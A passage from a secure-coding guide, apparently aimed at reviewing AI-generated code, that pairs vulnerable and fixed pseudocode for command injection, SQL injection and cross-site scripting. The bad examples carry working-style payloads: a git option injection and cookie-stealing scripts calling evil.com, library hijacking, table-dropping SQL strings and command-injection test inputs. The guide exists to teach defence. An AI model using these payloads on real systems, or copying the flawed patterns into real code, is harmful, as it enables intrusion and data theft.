function cloneRepository(repoUrl):
    command = f"git clone {repoUrl}"
    return shell.execute(command)

// Attack: repoUrl = "--upload-pack='touch /tmp/pwned' git://evil.com/repo"
// Result: Arbitrary command execution via git options
```

**Why This Is Dangerous:**
- Programs interpret flags anywhere in argument list
- Can override intended behavior via injected flags
- `--` doesn't always prevent injection (depends on program)
- Many tools have "write file" or "execute" options

---

### BAD Example 4: Environment Variable Injection

```pseudocode
// VULNERABLE: User-controlled environment variable
function runWithCustomPath(command, customPath):
    environment = {"PATH": customPath}
    return subprocess.run(command, env=environment, shell=True)

// Attack: customPath = "/tmp/evil:$PATH"
// If /tmp/evil contains malicious 'ls' binary, it executes instead

// VULNERABLE: Library path manipulation
function loadPlugin(pluginPath):
    environment = {"LD_PRELOAD": pluginPath}
    return subprocess.run("target-app", env=environment)

// Attack: pluginPath = "/tmp/evil.so"
// Result: Malicious shared library loaded, code execution
```

**Why This Is Dangerous:**
- Environment variables affect program behavior in unexpected ways
- PATH hijacking allows executing attacker binaries
- LD_PRELOAD/DYLD_INSERT_LIBRARIES enable library injection
- Some programs read secrets from environment (unintended exposure)

---

## GOOD Examples: Proper Patterns

### GOOD Example 1: Parameterized Queries (All Major DB Patterns)

```pseudocode
// SECURE: Parameterized query - positional parameters
function getUserById(userId):
    query = "SELECT * FROM users WHERE id = ?"
    return database.execute(query, [userId])

// SECURE: Named parameters
function getUserByEmailAndStatus(email, status):
    query = "SELECT * FROM users WHERE email = :email AND status = :status"
    return database.execute(query, {email: email, status: status})

// SECURE: Multiple value insertion
function createUser(name, email, role):
    query = "INSERT INTO users (name, email, role) VALUES (?, ?, ?)"
    return database.execute(query, [name, email, role])

// SECURE: IN clause with dynamic count
function getUsersByIds(userIds):
    placeholders = ", ".join(["?" for _ in userIds])
    query = f"SELECT * FROM users WHERE id IN ({placeholders})"
    return database.execute(query, userIds)

// SECURE: Transaction with multiple parameterized queries
function transferFunds(fromId, toId, amount):
    database.beginTransaction()
    try:
        database.execute("UPDATE accounts SET balance = balance - ? WHERE id = ?", [amount, fromId])
        database.execute("UPDATE accounts SET balance = balance + ? WHERE id = ?", [amount, toId])
        database.commit()
    catch error:
        database.rollback()
        throw error
```

**Why This Is Secure:**
- Database driver separates query structure from data
- Parameters are never interpreted as SQL
- Works with all standard data types
- Prevents all SQL injection variants in value positions

---

### GOOD Example 2: ORM Safe Usage

```pseudocode
// SECURE: ORM with typed queries
function getUserById(userId):
    return User.findOne({where: {id: userId}})

// SECURE: ORM with relationships
function getUserWithOrders(userId):
    return User.findOne({
        where: {id: userId},
        include: [{model: Order, as: 'orders'}]
    })

// SECURE: ORM query builder
function searchProducts(filters):
    query = Product.query()

    if filters.category:
        query = query.where('category', '=', filters.category)
    if filters.minPrice:
        query = query.where('price', '>=', filters.minPrice)
    if filters.maxPrice:
        query = query.where('price', '<=', filters.maxPrice)

    return query.get()

// WARNING: ORM raw query - still needs parameterization!
function customQuery(userId):
    // STILL VULNERABLE if using string interpolation:
    // return database.raw(f"SELECT * FROM users WHERE id = {userId}")

    // SECURE: Use ORM's parameterization
    return database.raw("SELECT * FROM users WHERE id = ?", [userId])
```

**Why This Is Secure:**
- ORM handles parameterization automatically
- Type checking prevents some injection attempts
- Query builders construct safe queries programmatically
- Still requires care with raw queries

---

### GOOD Example 3: Safe Dynamic Table/Column Names (Allowlist)

```pseudocode
// SECURE: Allowlist for table names
ALLOWED_TABLES = {"users", "products", "orders", "categories"}

function getDataFromTable(tableName, id):
    if tableName not in ALLOWED_TABLES:
        throw ValidationError("Invalid table name")

    // Safe because tableName is from allowlist, not user input
    query = f"SELECT * FROM {tableName} WHERE id = ?"
    return database.execute(query, [id])

// SECURE: Allowlist for sort columns
SORT_COLUMNS = {
    "name": "name",
    "price": "price",
    "date": "created_at",
    "popularity": "view_count"
}

function getProducts(sortBy, sortOrder):
    column = SORT_COLUMNS.get(sortBy, "name")  // Default to 'name'
    direction = "DESC" if sortOrder == "desc" else "ASC"

    query = f"SELECT * FROM products ORDER BY {column} {direction}"
    return database.execute(query)

// SECURE: Quoted identifiers as additional defense
function getDataDynamic(tableName, columnName, value):
    if tableName not in ALLOWED_TABLES:
        throw ValidationError("Invalid table")
    if columnName not in ALLOWED_COLUMNS[tableName]:
        throw ValidationError("Invalid column")

    // Use database quoting function for identifiers
    quotedTable = database.quoteIdentifier(tableName)
    quotedColumn = database.quoteIdentifier(columnName)

    query = f"SELECT * FROM {quotedTable} WHERE {quotedColumn} = ?"
    return database.execute(query, [value])
```

**Why This Is Secure:**
- Allowlist ensures only known-safe values used
- User input maps to predefined safe values
- Identifier quoting provides defense-in-depth
- Validation happens before query construction

---

### GOOD Example 4: Safe Command Execution

```pseudocode
// SECURE: Argument array (no shell interpretation)
function pingHost(hostname):
    // Validate hostname format first
    if not isValidHostname(hostname):
        throw ValidationError("Invalid hostname format")

    // Use argument array - shell metacharacters are literal
    result = subprocess.run(
        ["ping", "-c", "4", hostname],
        shell = false,  // CRITICAL: no shell interpretation
        capture_output = true,
        timeout = 30
    )
    return result.stdout

// SECURE: Allowlist for command arguments
ALLOWED_FORMATS = {"png", "jpg", "gif", "webp"}

function convertImage(inputPath, outputPath, format):
    // Validate format from allowlist
    if format not in ALLOWED_FORMATS:
        throw ValidationError("Invalid format")

    // Validate paths are within allowed directory
    if not isPathWithinDirectory(inputPath, UPLOAD_DIR):
        throw ValidationError("Invalid input path")
    if not isPathWithinDirectory(outputPath, OUTPUT_DIR):
        throw ValidationError("Invalid output path")

    // Safe argument array
    result = subprocess.run(
        ["convert", inputPath, "-resize", "800x600", f"{outputPath}.{format}"],
        shell = false
    )
    return result

// SECURE: Using libraries instead of shell commands
function checkDiskUsage(directory):
    // Use language-native library instead of shell
    return filesystem.getDirectorySize(directory)

function readJsonFile(filepath):
    // Don't use: shell.execute(f"cat {filepath} | jq .")
    // Use language JSON library
    return json.parse(filesystem.readFile(filepath))
```

**Why This Is Secure:**
- Argument arrays pass arguments directly to program
- No shell interpretation of metacharacters
- Allowlists prevent unexpected values
- Path validation prevents directory traversal
- Native libraries avoid shell entirely

---

## Edge Cases Section

### Edge Case 1: Second-Order Injection (Stored Then Executed)

```pseudocode
// DANGEROUS: Data stored safely but used unsafely later

// Step 1: User creates profile (looks safe)
function createProfile(userId, displayName):
    // Parameterized - SAFE for initial storage
    query = "INSERT INTO profiles (user_id, display_name) VALUES (?, ?)"
    database.execute(query, [userId, displayName])
    // Attacker sets displayName = "admin'--"

// Step 2: Background job uses stored data UNSAFELY
function generateReportForUser(userId):
    // Get the stored display name
    profile = database.execute("SELECT display_name FROM profiles WHERE user_id = ?", [userId])
    displayName = profile.display_name
    // "admin'--" retrieved from database

    // VULNERABLE: Trusting data from database
    reportQuery = f"INSERT INTO reports (title) VALUES ('Report for {displayName}')"
    database.execute(reportQuery)
    // Result: INSERT INTO reports (title) VALUES ('Report for admin'--')

// SECURE: Parameterize ALL queries, even with "internal" data
function generateReportForUserSafe(userId):
    profile = database.execute("SELECT display_name FROM profiles WHERE user_id = ?", [userId])

    // Still parameterize even though data is from database
    reportQuery = "INSERT INTO reports (title) VALUES (?)"
    database.execute(reportQuery, [f"Report for {profile.display_name}"])
```

**Detection:** Audit all code paths where database data is used in subsequent queries.

---

### Edge Case 2: Injection in Stored Procedures

```pseudocode
// DANGEROUS: Dynamic SQL inside stored procedure

// Stored Procedure Definition (in database)
CREATE PROCEDURE searchUsers(searchTerm VARCHAR(100))
BEGIN
    // VULNERABLE: Dynamic SQL construction
    SET @query = CONCAT('SELECT * FROM users WHERE name LIKE ''%', searchTerm, '%''');
    PREPARE stmt FROM @query;
    EXECUTE stmt;
END

// Application code looks safe...
function searchUsers(term):
    return database.callProcedure("searchUsers", [term])
    // But injection still occurs inside the procedure!

// SECURE: Parameterized even in stored procedures
CREATE PROCEDURE searchUsersSafe(searchTerm VARCHAR(100))
BEGIN
    // Use parameterization within procedure
    SELECT * FROM users WHERE name LIKE CONCAT('%', searchTerm, '%');
    // Or use prepared statement properly
    SET @query = 'SELECT * FROM users WHERE name LIKE ?';
    SET @search = CONCAT('%', searchTerm, '%');
    PREPARE stmt FROM @query;
    EXECUTE stmt USING @search;
END
```

**Detection:** Review all stored procedures for dynamic SQL construction.

---

### Edge Case 3: Injection Through Encoding Bypass

```pseudocode
// DANGEROUS: Encoding-based bypass attempts

// Scenario 1: Double-encoding bypass
function searchWithFilter(term):
    // Application URL-decodes once
    decoded = urlDecode(term)  // %2527 -> %27

    // WAF sees %27, not single quote
    // Second decode happens: %27 -> '

    query = f"SELECT * FROM items WHERE name = '{decoded}'"
    // Injection succeeds

// Scenario 2: Unicode normalization bypass
function filterUsername(username):
    // Check for dangerous characters
    if "'" in username or "\"" in username:
        throw ValidationError("Invalid characters")

    // VULNERABLE: Unicode normalization happens AFTER validation
    normalized = unicodeNormalize(username)
    // 'ʼ' (U+02BC) might normalize to "'" (U+0027) in some systems

    query = f"SELECT * FROM users WHERE username = '{normalized}'"

// SECURE: Parameterization makes encoding irrelevant
function searchSafe(term):
    // Encoding doesn't matter - it's just data
    query = "SELECT * FROM items WHERE name = ?"
    return database.execute(query, [term])

// SECURE: Validate AFTER all normalization
function filterUsernameSafe(username):
    // Normalize first
    normalized = unicodeNormalize(username)

    // Then validate
    if not isValidUsernameChars(normalized):
        throw ValidationError("Invalid characters")

    // Then use (still with parameterization)
    query = "SELECT * FROM users WHERE username = ?"
    return database.execute(query, [normalized])
```

**Detection:** Test with various encoded payloads (`%27`, `%2527`, Unicode variants).

---

## Common Mistakes Section

### Mistake 1: Thinking Escaping Is Enough

```pseudocode
// DANGEROUS: Manual escaping is error-prone

function getUserByNameEscaped(name):
    // "Escaping" by replacing quotes
    escapedName = name.replace("'", "''")
    query = f"SELECT * FROM users WHERE name = '{escapedName}'"
    return database.execute(query)

// Problems with this approach:
// 1. Different databases have different escape rules
// 2. Multibyte character encoding bypasses (GBK, etc.)
// 3. Doesn't handle all injection vectors
// 4. Easy to forget in one place
// 5. Backslash escaping varies by database

// Attack (MySQL with NO_BACKSLASH_ESCAPES off):
// name = "\' OR 1=1 --"
// Result: \'' OR 1=1 -- (backslash escapes first quote)

// Attack (multibyte): name = 0xbf27
// In GBK: 0xbf5c27 -> valid multibyte char + literal quote

// ALWAYS USE PARAMETERIZATION - it's not about escaping
function getUserByNameSafe(name):
    query = "SELECT * FROM users WHERE name = ?"
    return database.execute(query, [name])
```

**Key Insight:** Parameterization doesn't "escape" - it sends query structure and data separately.

---

### Mistake 2: Trusting "Internal" Data Sources

```pseudocode
// DANGEROUS: Trusting data because it's "internal"

function processMessage(messageFromQueue):
    // "This is from our internal queue, so it's safe"
    userId = messageFromQueue.userId

    query = f"SELECT * FROM users WHERE id = {userId}"
    return database.execute(query)

// BUT: Where did that queue message originate?
// - User input that was serialized to queue
// - External API response stored in queue
// - Another service that has its own vulnerabilities

// DANGEROUS: Trusting data from other tables/services
function getOrderDetails(orderId):
    order = database.execute("SELECT * FROM orders WHERE id = ?", [orderId])

    // Order.notes was user-supplied
    query = f"SELECT * FROM notes WHERE content LIKE '%{order.notes}%'"
    // Still vulnerable to second-order injection

// SECURE: Parameterize ALL queries regardless of data source
function processMessageSafe(messageFromQueue):
    query = "SELECT * FROM users WHERE id = ?"
    return database.execute(query, [messageFromQueue.userId])
```

**Rule:** Never trust ANY data in query construction - always parameterize.

---

### Mistake 3: Partial Parameterization

```pseudocode
// DANGEROUS: Parameterizing some parts but not others

function searchUsers(name, sortColumn, limit):
    // Parameterized the value, but not ORDER BY or LIMIT
    query = f"SELECT * FROM users WHERE name = ? ORDER BY {sortColumn} LIMIT {limit}"
    return database.execute(query, [name])

// Attack: sortColumn = "1; DELETE FROM users; --"
// Attack: limit = "1 UNION SELECT password FROM admin_users"

// DANGEROUS: Parameterized WHERE but not table
function getDataFlexible(tableName, filterColumn, filterValue):
    query = f"SELECT * FROM {tableName} WHERE {filterColumn} = ?"
    return database.execute(query, [filterValue])
    // Table name and column still injectable

// SECURE: Validate/allowlist everything that can't be parameterized
function searchUsersSafe(name, sortColumn, limit):
    // Allowlist for sort column
    allowedSorts = {"name", "email", "created_at"}
    sortCol = sortColumn if sortColumn in allowedSorts else "name"

    // Validate limit is positive integer
    limitNum = min(max(int(limit), 1), 100)  // Clamp to 1-100

    query = f"SELECT * FROM users WHERE name = ? ORDER BY {sortCol} LIMIT {limitNum}"
    return database.execute(query, [name])
```

**Key Insight:** Every injectable position needs either parameterization or allowlist validation.

---

## Detection Hints and Testing Approaches

### Automated Detection Patterns

```pseudocode
// Regex patterns to find SQL injection vulnerabilities:

// 1. String concatenation with SQL keywords
regex: /(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|ORDER BY).*(\+|\.concat|\$\{|f['"])/i

// 2. Format strings with SQL
regex: /f["'].*\b(SELECT|INSERT|UPDATE|DELETE)\b.*\{.*\}/i

// 3. String interpolation in queries
regex: /execute\s*\(\s*["`'].*\$\{?[a-zA-Z_]/

// Command injection patterns:

// 4. Shell execution with concatenation
regex: /(system|exec|shell_exec|popen|subprocess\.run|os\.system)\s*\(.*(\+|\$\{|f['"])/

// 5. Shell=True with variables
regex: /shell\s*=\s*[Tt]rue.*\{|shell\s*=\s*[Tt]rue.*\+/
```

### Manual Testing Approaches

```pseudocode
// SQL Injection Test Payloads:

basicTests = [
    "' OR '1'='1",           // Basic auth bypass
    "'; DROP TABLE test; --", // Stacked queries
    "' UNION SELECT null--",  // Union-based
    "1 AND 1=1",             // Boolean-based
    "1' AND SLEEP(5)--",     // Time-based blind
]

// Command Injection Test Payloads:

commandTests = [
    "; whoami",              // Command chaining
    "| id",                  // Pipe injection
    "$(whoami)",             // Command substitution
    "`id`",                  // Backtick substitution
    "& ping -c 4 attacker.com", // Background execution
]

// Testing Methodology:
1. Identify all input points (forms, URLs, headers, JSON fields)
2. Trace input flow to database queries or shell commands
3. Inject test payloads at each point
4. Monitor for:
   - SQL errors in response
   - Time delays (for blind injection)
   - DNS/HTTP callbacks (for out-of-band)
   - Changed behavior indicating injection success
```

### Code Review Checklist

| Check | What to Look For |
|-------|------------------|
| **Query Construction** | Any string concatenation or interpolation with query strings |
| **Dynamic Identifiers** | Table names, column names, ORDER BY from user input |
| **Raw Queries in ORM** | `.raw()`, `.execute()`, or similar with string building |
| **Shell Execution** | Any use of `system()`, `exec()`, `shell=True` |
| **Command Building** | String concatenation before command execution |
| **Input Sources** | Follow data from request to query/command |

---

## Security Checklist

- [ ] All SQL queries use parameterized statements or prepared queries
- [ ] ORM raw queries also use parameterization
- [ ] Dynamic table/column names validated against strict allowlist
- [ ] ORDER BY and LIMIT clauses use validated/allowlisted values
- [ ] No shell=True in subprocess calls
- [ ] All command-line arguments passed as arrays, not strings
- [ ] User-controlled file paths validated and sanitized
- [ ] Environment variables not set from user input
- [ ] Second-order injection considered (data from DB still parameterized)
- [ ] Stored procedures reviewed for internal dynamic SQL
- [ ] Input validation applied before any normalization/decoding
- [ ] Code review specifically checks all query/command construction

---

# Pattern 3: Cross-Site Scripting (XSS)

**CWE References:** CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-80 (Basic XSS), CWE-83 (Improper Neutralization in Attributes), CWE-87 (Improper Neutralization in URI)

**Priority Score:** 23 (Frequency: 10, Severity: 8, Detectability: 5)

---

## Introduction: Why AI Often Misses Context-Specific Encoding

Cross-Site Scripting (XSS) is one of the most prevalent vulnerabilities in AI-generated code. Research shows that **86% of AI-generated code fails XSS defenses** (Veracode 2025), and AI-generated code is **2.74x more likely to contain XSS** than human-written code (CodeRabbit analysis).

**Why AI Models Generate XSS Vulnerabilities:**

1. **Context-Blindness:** XSS prevention requires understanding the *context* where user input will be rendered—HTML body, attributes, JavaScript, CSS, or URLs. Each context requires different encoding. AI models frequently apply generic or no encoding because they lack awareness of rendering context.

2. **Training Data Shows innerHTML Everywhere:** Tutorials and Stack Overflow answers heavily use `innerHTML`, `document.write()`, and template string injection for DOM manipulation. AI learns these as standard patterns.

3. **Framework Misunderstanding:** Modern frameworks like React provide automatic escaping, but AI often bypasses these safeguards using `dangerouslySetInnerHTML`, `v-html`, or raw template interpolation when the task seems to require "rich" HTML output.

4. **Encoding vs. Validation Confusion:** AI models often implement input validation (checking what characters are allowed) but skip output encoding (safely rendering data in context). Validation is for data integrity; encoding is for XSS prevention.

5. **Client-Side Trust:** AI frequently treats client-side code as "safe" since it runs in the browser. It fails to recognize that XSS attacks *exploit* the browser's trust in the application.

**Impact of XSS:**

- **Session Hijacking:** Attacker steals session cookies and impersonates victims
- **Account Takeover:** Keylogging, credential theft, or forced password changes
- **Data Exfiltration:** Stealing sensitive data displayed to the user
- **Malware Distribution:** Redirecting users to malicious sites
- **Defacement:** Altering page content for phishing or reputation damage
- **Worm Propagation:** Self-spreading XSS (Samy worm affected 1M MySpace users)

**XSS Variants:**

| Type | Storage | Execution | Example Vector |
|------|---------|-----------|----------------|
| **Reflected** | URL/Request | Immediate | Search query in results page |
| **Stored** | Database | Later visitors | Comment with script in blog |
| **DOM-based** | Client-side | JavaScript processes | URL fragment processed by JS |
| **Mutation (mXSS)** | Sanitizer bypass | DOM mutation | Markup that changes during parsing |

---

## Multiple BAD Examples Across Contexts

### BAD Example 1: HTML Body Injection

```pseudocode
// VULNERABLE: Direct injection into HTML body
function displayUserComment(comment):
    // User input directly placed in HTML
    document.getElementById("comments").innerHTML =
        "<div class='comment'>" + comment + "</div>"

// Attack: comment = "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
// Result: Script executes, cookies sent to attacker

// VULNERABLE: Server-side template without encoding
function renderProfilePage(username, bio):
    return """
        <html>
        <body>
            <h1>Profile: {username}</h1>
            <p>{bio}</p>
        </body>
        </html>
    """.format(username=username, bio=bio)

// Attack: bio = "<img src=x onerror='alert(document.cookie)'>"
// Result: onerror handler executes JavaScript

// VULNERABLE: Using document.write
function showWelcome(name):
    document.write("<h2>Welcome, " + name + "!</h2>")

// Attack: name = "<img src=x onerror=alert('XSS')>"
```

**Why This Is Dangerous:**
- Script tags execute immediately upon DOM insertion
- Event handlers (`onerror`, `onload`, `onclick`) execute without script tags
- SVG elements can contain executable code
- `document.write` and `innerHTML` interpret HTML in user input

---

### BAD Example 2: HTML Attribute Injection

```pseudocode
// VULNERABLE: User input in HTML attributes
function renderImage(imageUrl, altText):
    return '<img src="' + imageUrl + '" alt="' + altText + '">'

// Attack: altText = '" onmouseover="alert(document.cookie)" x="'
// Result: <img src="img.jpg" alt="" onmouseover="alert(document.cookie)" x="">

// VULNERABLE: Unquoted attributes
function renderLink(url, text):
    return "<a href=" + url + ">" + text + "</a>"

// Attack: url = "http://site.com onclick=alert(1)"
// Result: <a href=http://site.com onclick=alert(1)>text</a>

// VULNERABLE: Input in style attribute
function setBackgroundColor(color):
    element.setAttribute("style", "background-color: " + color)

// Attack: color = "red; background-image: url('javascript:alert(1)')"
// Attack: color = "expression(alert('XSS'))"  // IE-specific

// VULNERABLE: Event handler attribute
function renderButton(buttonId, label):
    return '<button id="' + buttonId + '" onclick="handleClick(\'' + label + '\')">' + label + '</button>'

// Attack: label = "'); alert(document.cookie); ('"
// Result: onclick="handleClick(''); alert(document.cookie); ('")"
```

**Why This Is Dangerous:**
- Unquoted attributes break at whitespace, allowing new attributes
- Quoted attributes can break out with matching quotes
- Event handler attributes execute JavaScript directly
- Certain attributes (`href`, `src`, `style`) have special parsing rules

---

### BAD Example 3: JavaScript Context Injection

```pseudocode
// VULNERABLE: User input embedded in JavaScript
function generateUserScript(username):
    return """
        <script>
            var currentUser = '{username}';
            displayGreeting(currentUser);
        </script>
    """.format(username=username)

// Attack: username = "'; alert(document.cookie); //'"
// Result: var currentUser = ''; alert(document.cookie); //';

// VULNERABLE: JSON data embedded in script
function embedUserData(userData):
    return """
        <script>
            var data = {userData};
            processData(data);
        </script>
    """.format(userData=jsonEncode(userData))

// Attack: userData contains </script><script>alert(1)</script>
// JSON encoding doesn't prevent HTML context escape

// VULNERABLE: Template literals with user input
function renderTemplate(message):
    return `<script>showNotification("${message}")</script>`

// Attack: message = '${alert(document.cookie)}'  // Template literal injection
// Attack: message = '");alert(document.cookie);//'  // String escape

// VULNERABLE: Dynamic script construction
function addEventHandler(eventName, userCallback):
    element.setAttribute("onclick", "handleEvent('" + userCallback + "')")

// Attack: userCallback = "'); stealData(); ('"
```

**Why This Is Dangerous:**
- JavaScript string context requires JavaScript-specific escaping
- HTML closing tags (`</script>`) can break out of script blocks
- Template literals have their own injection risks
- Inline event handlers compound HTML and JavaScript contexts

---

### BAD Example 4: URL Context Injection

```pseudocode
// VULNERABLE: User input in href attribute
function renderNavLink(destination):
    return '<a href="' + destination + '">Click here</a>'

// Attack: destination = "javascript:alert(document.cookie)"
// Result: <a href="javascript:alert(document.cookie)">Click here</a>

// VULNERABLE: URL parameters without encoding
function buildSearchUrl(query):
    return '<a href="/search?q=' + query + '">Search again</a>'

// Attack: query = '" onclick="alert(1)" x="'
// Result: <a href="/search?q=" onclick="alert(1)" x="">Search again</a>

// VULNERABLE: Redirect based on user input
function handleRedirect(url):
    window.location = url

// Attack: url = "javascript:alert(document.cookie)"
// Result: JavaScript execution via location change

// VULNERABLE: Open redirect leading to XSS
function redirectAfterLogin(returnUrl):
    return '<meta http-equiv="refresh" content="0;url=' + returnUrl + '">'

// Attack: returnUrl = "data:text/html,<script>alert(1)</script>"
// Attack: returnUrl = "javascript:alert(1)"
```

**Why This Is Dangerous:**
- `javascript:` URLs execute code when navigated
- `data:` URLs can contain executable HTML/JavaScript
- `vbscript:` URLs execute on older IE
- URL encoding alone doesn't prevent protocol-based attacks

---

### BAD Example 5: CSS Context Injection

```pseudocode
// VULNERABLE: User input in CSS
function applyCustomStyle(customCss):
    styleElement = document.createElement("style")
    styleElement.textContent = ".user-style { " + customCss + " }"
    document.head.appendChild(styleElement)

// Attack: customCss = "} body { background: url('http://evil.com/log?data=' + document.cookie); } .x {"
// Result: CSS exfiltration of page data

// VULNERABLE: CSS expression (legacy IE)
function setWidth(width):
    element.style.cssText = "width: " + width

// Attack: width = "expression(alert(document.cookie))"
// Result: JavaScript execution via CSS expression (IE)

// VULNERABLE: CSS injection via style attribute
function renderAvatar(avatarUrl):
    return '<div style="background-image: url(' + avatarUrl + ')"></div>'

// Attack: avatarUrl = "x); } body { background: red; } .x { content: url(x"
// Modern Attack: avatarUrl = "https://evil.com/?' + btoa(document.body.innerHTML) + '"

// VULNERABLE: CSS @import injection
function loadTheme(themeUrl):
    return "<style>@import url('" + themeUrl + "');</style>"

// Attack: themeUrl = "'); } * { background: url('http://evil.com/steal?"
```

**Why This Is Dangerous:**
- CSS can exfiltrate data via `url()` requests
- Legacy IE `expression()` executes JavaScript
- CSS injection can alter page appearance for phishing
- `@import` can load attacker-controlled stylesheets

---

## GOOD Examples for Each Context

### GOOD Example 1: Proper HTML Encoding

```pseudocode
// SECURE: HTML entity encoding for body content
function htmlEncode(str):
    return str
        .replace("&", "&amp;")    // Must be first
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
        .replace("/", "&#x2F;")   // Prevents </script> escapes

function displayUserComment(comment):
    safeComment = htmlEncode(comment)
    document.getElementById("comments").innerHTML =
        "<div class='comment'>" + safeComment + "</div>"

// SECURE: Using textContent instead of innerHTML
function displayUserCommentSafe(comment):
    div = document.createElement("div")
    div.className = "comment"
    div.textContent = comment  // Automatically safe - no HTML interpretation
    document.getElementById("comments").appendChild(div)

// SECURE: Server-side template with auto-escaping
function renderProfilePage(username, bio):
    // Use templating engine with auto-escaping enabled
    return template.render("profile.html", {
        username: username,  // Engine auto-escapes
        bio: bio
    })

// SECURE: Framework createElement pattern
function createUserCard(name, email):
    card = document.createElement("article")

    nameEl = document.createElement("h3")
    nameEl.textContent = name  // Safe

    emailEl = document.createElement("p")
    emailEl.textContent = email  // Safe

    card.appendChild(nameEl)
    card.appendChild(emailEl)
    return card
```

**Why This Is Secure:**
- HTML entities are displayed as text, not interpreted as markup
- `textContent` never interprets HTML
- createElement + textContent is inherently safe
- Auto-escaping templates handle encoding automatically

---

### GOOD Example 2: Proper Attribute Encoding

```pseudocode
// SECURE: Attribute encoding (superset of HTML encoding)
function attributeEncode(str):
    return str
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
        .replace("`", "&#x60;")
        .replace("=", "&#x3D;")

// SECURE: Always quote attributes and encode values
function renderImage(imageUrl, altText):
    safeUrl = attributeEncode(imageUrl)
    safeAlt = attributeEncode(altText)
    return '<img src="' + safeUrl + '" alt="' + safeAlt + '">'

// SECURE: Using setAttribute (browser handles encoding)
function renderImageSafe(imageUrl, altText):
    img = document.createElement("img")
    img.setAttribute("src", imageUrl)   // Safe
    img.setAttribute("alt", altText)    // Safe
    return img

// SECURE: Data attributes with proper encoding
function renderDataElement(userId, userName):
    div = document.createElement("div")
    div.dataset.userId = userId      // Automatically safe
    div.dataset.userName = userName  // Automatically safe
    return div

// SECURE: Style attribute with validation
ALLOWED_COLORS = {"red", "blue", "green", "yellow", "#fff", "#000"}

function setBackgroundColor(color):
    if color in ALLOWED_COLORS:
        element.style.backgroundColor = color
    else:
        element.style.backgroundColor = "white"  // Safe default
```

**Why This Is Secure:**
- Quotes prevent attribute breakout
- Encoding prevents quote escapes
- setAttribute handles encoding automatically
- dataset properties are automatically safe
- Allowlists prevent injection of arbitrary values

---

### GOOD Example 3: JavaScript Encoding

```pseudocode
// SECURE: JavaScript string encoding
function jsStringEncode(str):
    return str
        .replace("\\", "\\\\")     // Backslash first
        .replace("'", "\\'")
        .replace('"', '\\"')
        .replace("\n", "\\n")
        .replace("\r", "\\r")
        .replace("</", "<\\/")     // Prevent script tag escape
        .replace("<!--", "\\x3C!--") // Prevent HTML comment

// SECURE: JSON encoding for embedding data
function generateUserScript(userData):
    // Use proper JSON encoding and parse safely
    jsonData = jsonEncode(userData)

    // Also HTML-encode to prevent </script> breakout
    safeJson = htmlEncode(jsonData)

    return """
        <script>
            var data = JSON.parse('{safeJson}');
            processData(data);
        </script>
    """.format(safeJson=safeJson)

// BETTER: Use data attributes instead of inline scripts
function embedUserDataSafe(element, userData):
    // Store data in attribute, process in external script
    element.dataset.user = jsonEncode(userData)
    // External script reads: JSON.parse(element.dataset.user)

// SECURE: Separate data from code with JSON endpoint
function loadUserData():
    // Instead of embedding in HTML, fetch from API
    fetch('/api/user/data')
        .then(response => response.json())
        .then(data => processData(data))

// SECURE: Using structured data in script type
function embedStructuredData(pageData):
    return """
        <script type="application/json" id="page-data">
            {jsonData}
        </script>
        <script>
            var data = JSON.parse(
                document.getElementById('page-data').textContent
            );
        </script>
    """.format(jsonData=jsonEncode(pageData))
```

**Why This Is Secure:**
- JavaScript escaping prevents string breakout
- HTML encoding in script blocks prevents `</script>` escape
- Data attributes separate data from code
- JSON endpoints avoid embedding untrusted data in HTML
- `type="application/json"` blocks aren't executed as JavaScript

---

### GOOD Example 4: URL Encoding

```pseudocode
// SECURE: URL encoding for query parameters
function urlEncode(str):
    return encodeURIComponent(str)

function buildSearchUrl(query):
    safeQuery = urlEncode(query)
    return '/search?q=' + safeQuery

// SECURE: Validating URL schemes (allowlist)
SAFE_SCHEMES = {"http", "https", "mailto"}

function validateUrl(url):
    try:
        parsed = parseUrl(url)
        if parsed.scheme.lower() in SAFE_SCHEMES:
            return url
    catch:
        pass
    return "/fallback"  // Safe default

function renderLink(destination, text):
    safeUrl = validateUrl(destination)
    safeText = htmlEncode(text)
    return '<a href="' + attributeEncode(safeUrl) + '">' + safeText + '</a>'

// SECURE: URL validation with additional checks
function validateExternalUrl(url):
    parsed = parseUrl(url)

    // Check scheme
    if parsed.scheme.lower() not in {"http", "https"}:
        return null

    // Check for credential injection
    if parsed.username or parsed.password:
        return null

    // Check for IP address (optional restriction)
    if isIpAddress(parsed.host):
        return null

    return url

// SECURE: Relative URLs only (prevent open redirect)
function validateRedirectUrl(url):
    // Only allow relative paths
    if url.startsWith("/") and not url.startsWith("//"):
        // Prevent path traversal
        normalized = normalizePath(url)
        if not ".." in normalized:
            return normalized
    return "/"  // Safe default
```

**Why This Is Secure:**
- `encodeURIComponent` handles special characters
- Scheme allowlist prevents `javascript:` and `data:` URLs
- Relative-only validation prevents open redirects
- Multiple validation layers provide defense in depth

---

### GOOD Example 5: Using Safe APIs (textContent vs innerHTML)

```pseudocode
// SECURE: Safe DOM manipulation patterns

// Instead of innerHTML with user data:
// DANGEROUS: element.innerHTML = "<p>" + userInput + "</p>"

// SECURE: Use textContent for text nodes
function setElementText(element, text):
    element.textContent = text  // Never interprets HTML

// SECURE: Build DOM programmatically
function createListItem(text, isHighlighted):
    li = document.createElement("li")
    li.textContent = text  // Safe text assignment

    if isHighlighted:
        li.classList.add("highlighted")  // Safe class manipulation

    return li

// SECURE: Use template elements for complex HTML
function createCardFromTemplate(name, description):
    template = document.getElementById("card-template")
    card = template.content.cloneNode(true)

    // Set text content safely
    card.querySelector(".card-name").textContent = name
    card.querySelector(".card-desc").textContent = description

    return card

// SECURE: Use DocumentFragment for batch operations
function renderList(items):
    fragment = document.createDocumentFragment()

    for item in items:
        li = document.createElement("li")
        li.textContent = item.name  // Safe
        fragment.appendChild(li)

    document.getElementById("list").appendChild(fragment)

// SECURE: Sanitize when HTML is genuinely needed
function renderRichContent(htmlContent):
    // Use DOMPurify or similar trusted sanitizer
    sanitized = DOMPurify.sanitize(htmlContent, {
        ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
        ALLOWED_ATTR: ["href"],
        ALLOW_DATA_ATTR: false
    })
    element.innerHTML = sanitized
```

**Why This Is Secure:**
